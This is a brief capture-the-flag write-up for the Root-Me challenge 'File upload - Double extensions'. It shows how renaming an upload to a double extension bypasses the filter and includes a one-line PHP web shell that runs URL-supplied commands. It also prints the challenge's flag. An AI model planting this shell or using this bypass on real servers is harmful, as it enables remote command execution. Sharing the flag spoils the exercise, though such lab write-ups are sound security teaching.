## Challenge name: File upload - Double extensions

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions)

**After starting the challenge we can see a photo gallery v2 as we solved v1 previously and we can upload images in gallery.**

**We will open burpsuite to analyze request while we upload files and try to bypass the file upload logic and instead of image we will upload .php file.**

**From the original request we will change the file name from `filename="image.jpg"` to `filename="image.php.jpg"`. As the challenge says double extension it checks and removes the last one but whatever the first extension is it thinks/executes it as that.**

**Also we will put this php code:**
```
<?php system($_GET["cmd"]); ?>
```

**After forwarding the request we can see success message. We can see .passwd in users home folder after doing ls in it.**

**We got our flag/passwd as "Gg9LRz-hWSxqqUKd77-_q-6G8" we can use this to solve the challenge.**

**Thankyou.**
